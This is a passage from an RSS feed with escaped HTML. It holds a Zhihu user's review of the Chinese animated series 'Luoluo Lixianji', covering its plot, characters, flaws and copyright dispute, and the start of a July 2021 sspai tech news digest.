data-private-watermark-src=\"v2-4138b79cc068b39a2d000f0e02ef1c58\"></p>\n<p>待攻占能源之城后，这也仅仅只是个开始。</p>\n<p>洛洛、闪电（城主）、霹雳火以及急先锋掉入火龙山谷，在此练习流影电光闪。</p>\n<p>而风火轮、龙卷风和力霸天则前往圣骑森林，一是为力霸天接回其断臂，二是寻找冲击波。</p>\n<p>之后狂野猩出来攻打猛虎王，金铁兽牺牲来救狂野猩。</p>\n<p>蓝毒兽背叛猛虎王，暴龙神来摘取胜利的果实，闪电战死，力霸天出手营救猛虎王，最后猛虎王掉下火龙山谷为这一篇章画上句号。</p>\n<p><br></p>\n<p>除此外，我对这个篇章映像深刻的一点就是，当初我家里有碟片机，当初看这部动画的方式是用光盘来看。而那时家里的电视机有一个臭毛病。</p>\n<p>即DVD播放到一定时间段时，就会蓝屏，即再也观看不下去。我也不知道这是何毛病。而恰好，每次看到能源之城攻防战的时候，就卡在那里。</p>\n<p>之后的剧情就再也看不到了，所以我一直很发疯，明明后续就在眼前，却无法观看，想起来就难受。</p>\n<p><b>最终战</b></p>\n<p>除了能源之城篇，最终战篇我也觉得可以具体展开讲讲。</p>\n<p>战前，机车族练成了合击了绝技，准备将猛兽族分而击之。</p>\n<p>不过，在后半段方才出现的猛兽族机战王晶晶改变了这一切，让本来可以较为顺利进行的计划蒙上一层阴影。</p>\n<p>暴龙神先来到狂野之城，明面上围魏救赵，实则是狂野猩调到亡灵之都。而猛虎王则选择放弃攻打雷霆殿，回到狂野之城，然后暴龙神再前往雷霆殿。至此，克制关系已经完全反了过来。</p>\n<p>按照其计划，猛兽族可以一举赢下机车族。</p>\n<p>不过，晶晶算漏了三点，</p>\n<p>第一点是忽视棋子自身情感，这一点在前文提到过，在此不再赘述。</p>\n<p>第二点就是蓝毒兽的存在，蓝毒兽拥有雷霆殿令牌，并将计划泄露给风火轮，最后让洛洛从亡灵之都逃出来，最后才得以让霹雳火与急先锋活下来。</p>\n<p>第三点则是留给霹雳火和急先锋的挂，月色。</p>\n<p>第一点导致前往狂野之城与亡灵之都的机车族没有死，全部聚集在雷霆殿当中。</p>\n<p>第二点导致整个计划被打乱。</p>\n<p>第三点则是导致没有霹雳火与急先锋没有被暴龙神杀死。</p>\n<p>机车族和猛兽族几乎全员到场，并且已经开战。</p>\n<p>二者也进入一个随时有可能你死我活的状态。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-04376315a18133734f286bc1d098124a_720w.jpg?rss\" data-rawwidth=\"1435\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-04376315a18133734f286bc1d098124a\" data-watermark-src=\"v2-29d27001bdad5b8cd728f12e23e1cb54\" data-private-watermark-src=\"v2-98f107dd167eed75a0cd870fab7d3c3c\"></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-be2264957612adb83afaccad62e76617_720w.jpg?rss\" data-rawwidth=\"751\" data-rawheight=\"570\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-be2264957612adb83afaccad62e76617\" data-watermark-src=\"v2-81700ed9396c8ffa94c86268a81443fe\" data-private-watermark-src=\"v2-bd87a70d47667a141a3b14012d83b857\"></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-e5661a52df66910b65921410d74ab897_720w.jpg?rss\" data-rawwidth=\"744\" data-rawheight=\"571\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-e5661a52df66910b65921410d74ab897\" data-watermark-src=\"v2-0db1fdf341750e755ec17ed2b4958d70\" data-private-watermark-src=\"v2-b826d58768d8a63caa434060c571c779\"></p>\n<p>最后以一种较为巧妙的方式解决了整个矛盾，即谈一谈。</p>\n<p>谈一谈，有时候真的可以解决问题。</p>\n<p>洛洛和晶晶都想回家，都需要对方的令牌，于是二者便选择合作，这样都可以一起回家了。</p>\n<p>这样机战王即不存在根本矛盾了，所以二者可以和平解决。</p>\n<p>可是，并未解决机车族和猛兽族的矛盾。</p>\n<p><br></p>\n<p>一个标准的王道少年动画剧本。</p>\n<p>情节能做到曲折而易懂，人物没有降智，亦未感受到相应降智，人物各种背叛与情感，以及即使是反派角色，亦有情有义。这种剧情，国内与之相似的有同样是国产动画的经典之作《虹猫蓝兔七侠传》。</p>\n<p><b>人物饱满</b></p>\n<p>《洛洛历险记》让人最为称道的是角色刻画，除了主角方机车族的刻画，反派方面的刻画亦不曾减少。</p>\n<p>无论是机车族，又或者是猛兽族，还是机战王，他们都会成长，都会改变。</p>\n<p><b>猛虎王</b>，他有一句经典的话，“<b>战争是一场肮脏的游戏，而我是一个肮脏的玩家</b>”。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-e84dce5c6c74be0037605180602f44d2_720w.jpg?rss\" data-rawwidth=\"755\" data-rawheight=\"562\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-e84dce5c6c74be0037605180602f44d2\" data-watermark-src=\"v2-b2c644223a313dbcdc420defdf0d36f6\" data-private-watermark-src=\"v2-3727b1565dc2ec272d0c33e53b325a69\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-e661a45668e9ad49cdba5bc2c4a2dd4e_720w.jpg?rss\" data-rawwidth=\"670\" data-rawheight=\"507\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-e661a45668e9ad49cdba5bc2c4a2dd4e\" data-watermark-src=\"v2-d33d16e98e8986957dd7071b0008a88a\" data-private-watermark-src=\"v2-d022a9af5b9e17e82bc23084c8718247\"></p>\n<p>猛虎王诡计多端，利用一切可以利用。以前他和狂野猩是朋友，后来为了利益可以三番五次算计狂野猩。他又极度讨厌叛徒，银铁兽背叛了狂野猩却被他转手杀死。</p>\n<p>不过当他开始频繁利用别人时，也许没有想到有面终有一天，自己也会被蓝毒兽背叛，亦绝不会想到，出来救他的是一自己暗算过多次的对手——力霸天。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-64384cf0c4b7cdc764a4186096dbbc5a_720w.jpg?rss\" data-rawwidth=\"754\" data-rawheight=\"554\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-64384cf0c4b7cdc764a4186096dbbc5a\" data-watermark-src=\"v2-a5f773e1eba5edee0f1d6d6ae24dfc4b\" data-private-watermark-src=\"v2-92cf2f0ef6097e71b4460dc8a2dd9b34\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-dd3aa325559dc39ebc9a816946913229_720w.jpg?rss\" data-rawwidth=\"743\" data-rawheight=\"562\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-dd3aa325559dc39ebc9a816946913229\" data-watermark-src=\"v2-083ca464b93e206e5f13ac6627cee8a3\" data-private-watermark-src=\"v2-260815ac4267ad72ed8d1bb24253dec5\"></p>\n<p>同样，猛虎王也想不到，当他向狂野猩借兵时，这个曾被他杀死过手下第一大将、多次暗算过狂野猩，可以借给他黑铁兽大军。并且狂野猩也没有要猛虎王的后备隐藏能源。</p>\n<p>猛虎王一直以来秉持想法，被现实一点点改变。</p>\n<p>所以他后来说出了“最珍贵的是朋友”这句话。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-80c0fe0865b1a63f2949ab649f1c2675_720w.jpg?rss\" data-rawwidth=\"749\" data-rawheight=\"567\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-80c0fe0865b1a63f2949ab649f1c2675\" data-watermark-src=\"v2-17204e7b2da13e499d5cf4ede725503b\" data-private-watermark-src=\"v2-e0071396e5c87216e730461892a9b6e9\"></p>\n<p>也是如此，最后才会放过力霸天和冲击波。</p>\n<p><br></p>\n<p><b>狂野猩</b>，一个迷信自己拳头的傻大个，以为自己在失去金铁兽后，便不再迷信自己的力量。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-7791a008833b5525d7c5b1f9ec5d1a79_720w.jpg?rss\" data-rawwidth=\"749\" data-rawheight=\"785\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-7791a008833b5525d7c5b1f9ec5d1a79\" data-watermark-src=\"v2-3edad96cbecf43d95e67f03255bbf5c8\" data-private-watermark-src=\"v2-69eebe8e216089374e741d3f01354999\"></p>\n<p>说起狂野猩，就不得不起金铁兽，金铁兽是在观众中人气很高，有勇有谋，忠心耿耿，多次救主，最后为了救出狂野猩，使用其后备隐藏能源，战死于沙场。</p>\n<p>金铁兽遇到了其伯乐，为狂野猩战死沙场也许是其最好的归宿。</p>\n<p>正所谓，士为知之者死。</p>\n<p><br></p>\n<p><b>暴龙神</b>，出场较晚，刻画亦比较少，一个典型的阴谋家，最后在能源之城篇后坐收渔人之利。可惜很快就被新猛兽族的机战王所控制，其个人想法并无太大展现，导致其并无太多刻画，可以说是挺可惜的。</p>\n<p><br></p>\n<p><b>霹雳火&amp;急先锋</b></p>\n<p>霹雳火，怜悯心太重，是其师父对霹雳火的评价。我认为他有一种精神，其名为博爱。在这个弱肉强食的世界里，尤为难得。</p>\n<p>强者才能生存的世界，还有情感存在。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-fd2e9633eb52b614382366e06541de99_720w.jpg?rss\" data-rawwidth=\"746\" data-rawheight=\"901\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-fd2e9633eb52b614382366e06541de99\" data-watermark-src=\"v2-aacf10cd730c6a6491e1ea16b7934393\" data-private-watermark-src=\"v2-19411593ce7f11588aaebf617c8f95f6\"></p>\n<p><br></p>\n<p>在后期，所有以强者为尊的角色，都或多或少因为情感而改变了观念，猛虎王、急先锋、龙卷风、狂野猩等等。</p>\n<p>除此之外，霹雳火还是洛洛的引路人。洛洛是游戏高手，却也无法理解这些事，毕竟也只是小毛孩。一切以自身利益至上的洛洛，也被霹雳火逐渐改变了其观念。</p>\n<p>全剧中，最少改变的就是他了。</p>\n<p>急先锋，名如其人，技能也亦如其人。一切都很急，亦很自大。</p>\n<p>然后被更强大的猛虎王所教育，便一蹶不振，其师父因此而死，月神殿亦因此而毁灭。</p>\n<p>之后，其心态亦改变很多，待到机战王洛洛来到后，方才重新找回其信念。</p>\n<p>一急一缓，组成一对，方能使其合击绝技“流影电光闪”。</p>\n<p><b>力霸天&amp;冲击波</b></p>\n<p>力霸天是典型的力量型选手，其性格亦是如此——稳重。</p>\n<p>本来是与世无争的一个推土机，但是其弟弟被蓝豹兽所杀之后，方才选择与霹雳火等人联手。</p>\n<p>路见不平，亦会拔刀相助，尊重一个战士，战士可以战死，但绝不能侮辱至死。</p>\n<p>冲击波，也是类似，只不过领地意识相对更强些见不贯欺负弱小之辈。</p>\n<p><b>龙卷风&amp;超音速</b></p>\n<p>龙卷风，据我观察，这是人气最高的机器人。</p>\n<p>首先是有个性。</p>\n<p>其次是帅，直升机与其它机器人相比，无论是其直升机形态还是其人形态，都是最好看的。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-9286a1dd7533faa0aa7e7997dc14f04d_720w.jpg?rss\" data-rawwidth=\"1432\" data-rawheight=\"1079\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-9286a1dd7533faa0aa7e7997dc14f04d\" data-watermark-src=\"v2-86cbe6eb986cc0b236ce95eec6b3fc44\" data-private-watermark-src=\"v2-e82b4f2162e1dd2f01fd4892f8e832ac\"></p>\n<p>这种有点痞痞的性格，再加上其强大的实力与其好看的机器身，人气高方才正常。</p>\n<p>其师父死（机车族人均死师父）后，其性格也越来越稳重。</p>\n<p>超音速，风雪之城城主，机车族第一高手。一开始因为师父风雪，而导致与其不和。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-5a2400e5549075713476948af5e473be_720w.jpg?rss\" data-rawwidth=\"1433\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-5a2400e5549075713476948af5e473be\" data-watermark-src=\"v2-30d06b5e80bba1ca17c1a429fc7a2126\" data-private-watermark-src=\"v2-1b7b5f41a974341c89b64d27e3f29649\"></p>\n<p>不过暴龙神的到来，反倒帮其来解决这多年以来未曾解决掉一段恩怨，一段闪电与风雪多年前的恩怨。</p>\n<p><b>洛洛</b></p>\n<p>一个无意间闯入游戏世界的小孩，亦是一个爱玩游戏的小孩。来到异世界后，会有想家的情绪，也会迷茫，不过在一步步地成长。</p>\n<p>他会为了自己输给女生而生气，会有好胜心。</p>\n<p>一开始他无法理解霹雳火等所做所为，不明白何为“大丈夫有所不为，有所必为”。</p>\n<p>后来看到金铁兽救了自己的时候，我想洛洛在那里就知道了何为</p>\n<p>不过渐渐地接受了自己机战王的身份，并担起了机战王的责任。</p>\n<p>但机战王到底是怎么样的，谁也不知道，只能靠猜，大家说洛洛是就是。</p>\n<blockquote>洛洛：我实在也不是谦虚，我一个小孩子，怎么就当上了机战王呢。</blockquote>\n<p><br></p>\n<p><b>蓝毒兽</b></p>\n<blockquote>战争是一场肮脏的游戏，而我是更肮脏的玩家。</blockquote>\n<p>一个绝对的利己主义者，本剧最成功的反派，无论是剧中还是剧外。</p>\n<p>阴枭，从其名字形象到其技能，无一透露着一股冷冰冰的感觉.</p>\n<p><img src=\"https://pic1.zhimg.com/v2-0d88d9d7dba4aa9b1118213250fec655_720w.jpg?rss\" data-rawwidth=\"745\" data-rawheight=\"555\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-0d88d9d7dba4aa9b1118213250fec655\" data-watermark-src=\"v2-8fc91463e47b62e24e8986ec4c03353d\" data-private-watermark-src=\"v2-04a1c8ae4c838bec6fd5153f7c92500d\"></p>\n<p>小个子而又类似于一种蚁兽的外形，与其他机器人有一股截然不同的感觉，其名字与其手下名字紫毒兽，都透着一股奇怪的气息。</p>\n<p>幽冥音波功，这个技能是一个声音攻击，中招者会使自身能力下降。</p>\n<p>每次在屏幕上看到他，都会感觉到很危险。</p>\n<p>在能源之城离间闪电和风雪，让其兄弟反目成仇，虽然自己的部族也被灭了。</p>\n<p>投奔暴龙神，暴龙神便将其安插在猛虎王那里，猛虎王也心知蓝毒兽另有所图，但还是选择留下他，因为这样可以利用他。</p>\n<p>可惜最后还是被蓝毒兽反利用了。</p>\n<p>大决战前抢下时光之城的令牌，以令牌胁迫两个机战王下约定，约定永不侵犯蓝毒兽。</p>\n<p>一般这种小人，在其他少儿动画中，少年动画里，最后的结局都不会好，不是死也会是一种较为惨淡的结局，譬如发疯、脑残。但是《洛洛》里竟然让其逍遥法外，这是我没想到的，也许当年在电视机前看动画的人也没有几个人能想到。</p>\n<p><b>其它优点</b></p>\n<p>合体技能的设计很好，单打独斗斗不过，但是使用其合体技便能赢下。并且有相对应的克制关系，更为奇妙的是，机车族这一方一个合体技能克制猛兽族一方，而猛兽族这一方换一个对象即可打败机车族。如猛虎王对冲击波&amp;力霸天。</p>\n<p>除此之外，就是很帅，合体技能的动画很帅。</p>\n<p>除此之外，还有一招特殊的合体技——月色血风暴。</p>\n<p>最后月色血风暴的那招，真的是挺让年幼的我挺激动的。</p>\n<p>洛洛被逼入绝境，最后依照月亮的力量，使出最后的绝招“月色血风暴”，虽然仍是无特殊效果，不过在其剧情、背景音乐的角度下显得尤为激动人心。</p>\n<p>现在想想，月光即为HP这个挂还是过于强了，即使这个挂是有伏笔的，霹雳火和急先锋身上都一堆月亮元素，月神殿、时光之城、雷霆半月斩等等，还在霹雳火在第一次月光之下使出其雷霆半月斩。</p>\n<p><b>缺点</b></p>\n<p>整个世界都很奇怪，</p>\n<p>比如机器人是如何生产出来的？剧中没有解释。</p>\n<p>为何在机器人的世界里，洛洛一个碳基生物在这里却没有人感到奇怪。</p>\n<p>机器人是靠什么补充能量的？源源不断的能量是从何而来？</p>\n<p>风火轮一个机器人怎么会开一些私生子的玩笑？</p>\n<p>洛洛怎么从不会感到饥饿？</p>\n<p>……</p>\n<p>但是又不是很奇怪，因为这个世界的产生就很不正常，是人为制造出来的。</p>\n<p>一切都是由程序算法而做成的。</p>\n<p>还是得说下其它缺点，这部动画的缺点还是挺多的，很大一部分是源于钱，另一方面可以说是由于经验不足。</p>\n<p>最直观的是打斗画面，这是蓝弧第一部真正意义上的打斗动画，其动作设计约等于没有。都是简单走走走，放技能，而后在比力气。</p>\n<p>兼用卡太多，不过这个在后期改善了很多，前几集里，黑铁兽大军的那段，真的是一个接一个来重复。</p>\n<p>还有就是少儿作品的通病了吧，动画技能的变身过多，但是不变身的话总感觉缺了什么，因为本来就没什么好的动作设计，并且其技能特效也约等于没有，大多时候就在那时比力气……</p>\n<p>除此之外，一些情节，不得不降智。譬如《引蛇出洞》这一集，猛虎王刚受了伤，又明白急先锋不可能是只有一个人，并且他们很有可能练成了“流影电光闪”，如此草率追出去，明显地给猛虎王降智了。</p>\n<h3>重制</h3>\n<p>开头方面，由一个网瘾少年更改为一个电竞少年，缺乏了代入感以及共鸣感。</p>\n<p>《洛洛历险记》在当初能火，很大程度是因为同是相对普通的少年，利用现实世界中的游戏知识，在游戏世界里一步步成长，带领相对较弱的机车族一步步地能与其抗衡。</p>\n<p>在此期间，这部动画带了一个其名为爽感的情绪。</p>\n<p>而阵子看了一个问题“如何看待穿越小说中，一个普通人穿越后智商爆表，完爆几十岁的老狐狸？”， 下面 <a class=\"member_mention\" href=\"http://www.zhihu.com/people/47ec72b16d39036ae7817992f4be8c4c\" data-hash=\"47ec72b16d39036ae7817992f4be8c4c\" data-hovercard=\"p$b$47ec72b16d39036ae7817992f4be8c4c\">@三叔侃侃</a> 的回答中指出两点爽文特征</p>\n<blockquote>\n<b>一、主人公起点不能过于夸张，否则缺乏代入感。</b><br><b>二、主人公必须在剧情过程中不断开启金手指和上帝视角，从而实现常人所不能。</b><sup data-draft-node=\"inline\" data-draft-type=\"reference\" data-numero=\"3\" data-text=\"\" data-url=\"https://www.zhihu.com/question/376857581/answer/1834736238\">[3]</sup>\n</blockquote>\n<p>照此来看，洛洛历险记亦是一标准的穿越型小说，不过十岁的小毛孩可以与活了几百年的猛虎族斗智斗勇。</p>\n<p>不过，这不正是我当初喜欢《洛洛》的原因吗。</p>\n<h3>后续</h3>\n<p>《百变机兽之洛洛历险记》，从其名字可以看出，百变机兽肯定不止这么一部作品。是的，百变机兽是一个系列，并且除了《洛洛历险记》外，还有一系列后续作品。</p>\n<p>譬如《神龙拯救队之元气星魂》</p>\n<p><img src=\"https://pic1.zhimg.com/v2-14a89ea824b03746dde38108ad98d647_720w.jpg?rss\" data-rawwidth=\"1601\" data-rawheight=\"1000\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-14a89ea824b03746dde38108ad98d647\" data-watermark-src=\"v2-248f6a0dee55cfef743e6c291078fc52\" data-private-watermark-src=\"v2-9526e133967ec51c84d19fe83ea89545\"></p>\n<p>《霹雳勇士之元气勇者》</p>\n<p><img src=\"https://pic3.zhimg.com/v2-67e04965964c8823d94f368d1e82cd6c_720w.jpg?rss\" data-rawwidth=\"800\" data-rawheight=\"800\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-67e04965964c8823d94f368d1e82cd6c\" data-watermark-src=\"v2-d884db7aad409a2bf1404f52fe49a591\" data-private-watermark-src=\"v2-80ff6665f0cf06b41dbcc3cd2124cdc1\"></p>\n<p>以及《元气拯救队》</p>\n<p><img src=\"https://pic3.zhimg.com/v2-1670333acb6e687a8cae3fcd6854c111_720w.jpg?rss\" data-rawwidth=\"695\" data-rawheight=\"817\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-1670333acb6e687a8cae3fcd6854c111\" data-watermark-src=\"v2-3b082e57819708e96a588a935c40504c\" data-private-watermark-src=\"v2-06a971ec71c74565467ef5057f09b277\"></p>\n<p>从其机器人外表来看，这三部都是百变机兽的系列作品，只不过世界观和制作公司与《洛洛》完全无关。</p>\n<p>这三部动画的制作均由星杰和湖南金鹰联合出品，星原进行制作的作品。</p>\n<p>至于为何不与蓝弧合作，我不清楚其内幕。明明二者的合作是属于互相成就，推测是二者对于版本的归属有了争议。</p>\n<p>以至于后来蓝弧和奥飞联合制作了重制版动画《武战道》，不过却被星杰告上法庭，最后于2018年宣判。</p>\n<blockquote>2018年4月20日，法院作出一审判决，认定《武战道》侵犯该剧著作权人的权利，酌情判令三被告（蓝弧动漫、蓝弧文化、奥飞）共同向该剧权利人王巍支付著作权使用费120万元。<sup data-draft-node=\"inline\" data-draft-type=\"reference\" data-numero=\"4\" data-text=\"\" data-url=\"https://baike.baidu.com/reference/8103125/4bec-P9AbeZ0Vakwoerm9kZcAnShQO88WNAJJ_hMYx2FbfGvAbZDfnTREgcVzsavmFPOUucErSwFQSF5hm3LIzm5Buw\">[4]</sup>\n</blockquote>\n<p>一个剧本拍出两部动画，谁侵权？</p>\n<p>我不大熟悉法律，将其判决放在此处，读者可自行评判。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-86159e9d9bbaa04ac951438852742417_720w.jpg?rss\" data-rawwidth=\"841\" data-rawheight=\"827\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-86159e9d9bbaa04ac951438852742417\" data-watermark-src=\"v2-1732b4298895f0d7c47608c6b48bcbc8\" data-private-watermark-src=\"v2-c75e88bac0dd4f2f978b31506a154c77\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-b3edd5ce4627d8c861acde3af7131173_720w.jpg?rss\" data-rawwidth=\"866\" data-rawheight=\"826\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-b3edd5ce4627d8c861acde3af7131173\" data-watermark-src=\"v2-6ae0e596892aa85d7d1357d0ef569d84\" data-private-watermark-src=\"v2-f341d3e7c0bf48e47f46ec2c11929a37\"></p>\n<p><sup data-draft-node=\"inline\" data-draft-type=\"reference\" data-numero=\"5\" data-text=\"一个剧本拍出两部动画，谁侵权？\" data-url=\"https://gd.qq.com/a/20180419/029886.htm\">[5]</sup></p>\n<p>我对这个版权归属争议的看法很简单，即是遗憾。</p>\n<p>若是星杰仍继续与蓝弧合作，其后续至少比上述这些动画更有看头。</p>\n<p>可以出前传，前一任机战王的经历；亦可以出后续，最后机车族与猛兽族还是打了起来，因为最后仅仅只是洛洛和晶晶的矛盾解决，而机车族与猛兽族的根本矛盾从未解决，其根本矛盾即程序设计开始，便植入其根中的战斗设计。</p>\n<p>回到现实世界中，洛洛和晶晶仍在互相对战，一切又似乎回到了原点。</p>\n<p>但一切都在在2009年戛然而止，《洛洛历险记》最终还是没有其后续之作。</p>\n<h3>结语</h3>\n<p>其作品本身而言，一部有缺点，但是剧情优秀，人物刻画饱满的作品。</p>\n<p>一部奠定蓝弧风格的作品，自此，蓝弧完成了从制作日常动画变成了制作机甲动画的转换。</p>\n<p>也因这部动画而迈向其巅峰期，不过，五年后重制版折戟，使得蓝弧不得不再寻找转型之路。</p>\n<p>若仅仅也是折戟，亦还可接受，动画总会有成败，此时（2014）的蓝弧不再是五年前的小公司，此时已经拥有一定的经济实力，亦有相对应的抗压能力。此事带来其后果是，与星杰翻脸，并开始了官司之路。</p>\n<p>蓝弧此时可能未曾想到，它所面临的版权问题，仅仅只是开始。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-dac1ca748f8731f819837af7b4b3ca8e_720w.jpg?rss\" data-rawwidth=\"746\" data-rawheight=\"558\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-dac1ca748f8731f819837af7b4b3ca8e\" data-watermark-src=\"v2-b811c8b29f1413a2166c088d58a0530c\" data-private-watermark-src=\"v2-3c676be8309847a08e5f970f95ecdb4b\"></p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/jinl1874?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">道理</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/63320560/answer/1891698659?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">27 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/29003517?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价天元突破里的人物？</a><br><a href=\"http://www.zhihu.com/question/272101362?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">那些动画形象贯穿你的童年？</a><br>\n","link":"http://www.zhihu.com/question/63320560/answer/1891698659?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"派早报：国家网信办通报滴滴出行 App 下架整改、OxygenOS 将与 ColorOS 进行整合等","date":"2021-07-05 00:50:13","description":"\n<h2>国家网信办通报滴滴出行 App 下架整改</h2>\n<p>国家网信办于 7 月 4 日发出通报，根据举报和检测核实，滴滴出行 App 由于存在严重违法违规收集使用个人信息问题。国家互联网信息办公室依据《中华人民共和国网络安全法》相关规定，通知应用商店下架滴滴出行 App，要求滴滴出行科技有限公司严格按照法律要求，参照国家有关标准，认真整改存在的问题，切实保障广大用户个人信息安全。</p>\n<p>滴滴出行方面，副总裁李敏在微博上发帖回复，坚决不会将用户数据交由美国方面，包含道路数据。其次，公司也表示坚决落实国家有关部门的相关要求，暂停新用户注册进行下架整改，并不断提升风险防范意识和技术能力，持续保护用户隐私和数据安全，防范网络安全风险，持续为用户提供安全便捷的服务。来源 (<a href=\"https://mp.weixin.qq.com/s/oywiAT8K4NbgQBY-rlbiGA\" target=\"_blank\">1</a>, <a href=\"https://weibo.com/2838754010/Kndugz0Jl\" target=\"_blank\">2</a>, <a href=\"https://weibo.com/1642084983/Kn1DZyUzQ\" target=\"_blank\">3</a>)</p>\n<h2>一加 OxygenOS 将与 OPPO ColorOS 系统整合</h2>\n<p>在一加成为 OPPO 旗下独立运营品牌之后，海外市场发行的 OxygenOS 系统也将会和 OPPO 的 ColorOS 进行整合。根据官方论坛的公告，开发团队正在整合 OxygenOS 以及 ColorOS 的代码库，整合之后的系统仍会是为国际用户准备的系统版本，只是换到了更稳定以及更强的平台，用户感受不到太大的区别。</p>\n<p>同时，一加也公布了最新的 Android 系统支持变化，不早于 OnePlus 8 系列的旗舰款机型能收到三次重大更新以及四次安全更新，Nord CE 和 Nord 系列将会获得两次重大更新和三年安全更新，至于定位最低的 Nord N 系列则会获得一次重大更新和三年安全更新。<a href=\"https://cn.engadget.com/oneplus-oppo-oxygenos-coloros-shared-codebase-020059785.html\" target=\"_blank\">来源</a></p>\n<h2>macOS Monterey 推出公开测试版本</h2>\n<p>Apple 于 7 月 2 日正式开放了 macOS Monterey 首个 Public Beta 公测版本，相比往年的 macOS 更新，macOS Monterey 相对来说变动较小，而在首个公测版本中也并没有出现 WWDC 上公布的 Universal Control 功能，但可以看到全新的 Safari、FaceTime、AirPlay 以及 Shortcuts 等新功能。你可以在 <a href=\"https://beta.apple.com/sp/zh/betaprogram/\" target=\"_blank\">Apple Bet</a><a href=\"https://beta.apple.com/sp/betaprogram/\" target=\"_blank\">a 版软件计划页面</a> 注册提前体新的系统版本。<a href=\"https://cn.engadget.com/apple-macos-monterey-public-beta-launch-010034228.html\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/04/6a3d7d0a077652c0cf3c72411b4dc178.jpeg\"></figure><h2>诺基亚回复接入鸿蒙系统传闻</h2>\n<p>7 月 1 日，诺基亚方面针对近期有关即将推出的新款手机诺基亚 X60 和 X60 Pro 或将搭载鸿蒙系统的传闻进行回复，官方表示对提供最佳 Android 系统体验的承诺仍然坚定不移，但未明确表示是否将有机型将搭载鸿蒙操作系统。<a href=\"https://finance.sina.com.cn/tech/2021-07-01/doc-ikqciyzk2966459.shtml\" target=\"_blank\">来源</a></p>\n<h2>《对马岛之魂 导演剪辑版》将于 8 月 20 日发售</h2>\n<p>7 月 2 日，Playstation 官方宣布《对马岛之魂 导演剪辑版》将于 8 月 20 日发售，游戏提供中、日、英、韩文语言支持，并将登陆 PS4 与 PS5 平台。目前，《对马岛之魂》的版本升级包已经上架了港服 PS 商店，已经拥有 PS4 版《对马岛之魂》的玩家，能以 158 港元的价格购买。<a href=\"https://store.playstation.com/zh-hans-hk/product/HP9000-CUSA16972_00-GHOSTDIRECTORCUT\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/04/article/79f08bb94a9146e019106611b638990b\"></figure><h2>保时捷或将针对部分 Taycan 车型进行召回</h2>\n<p>近日，美国国家公路交通安全管理局针对保时捷 Taycan 车型动力突然消失的异常问题进行调查，发现 2020-2021 的 Taycan 12V 辅助电池断电可能会使整个电力系统停止工作并造成车辆无法启动。保时捷方面回复称已开始着手解决问题，并可能针对相关车辆进行召回。<a href=\"https://www.bloomberg.com/news/articles/2021-07-01/porsche-readies-global-taycan-ev-recall-to-fix-software-issue\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/04/article/eb982e731ff8502870b182c667103537\"></figure><h2>你可能错过的文章</h2>\n<ul>\n<li><a href=\"https://sspai.com/post/67499\" target=\"_blank\">watchOS 8 推出首个公测版，这些新功能值得尝鲜体验</a></li>\n<li><a href=\"https://sspai.com/post/67439\" target=\"_blank\">如何真实描绘 iPad 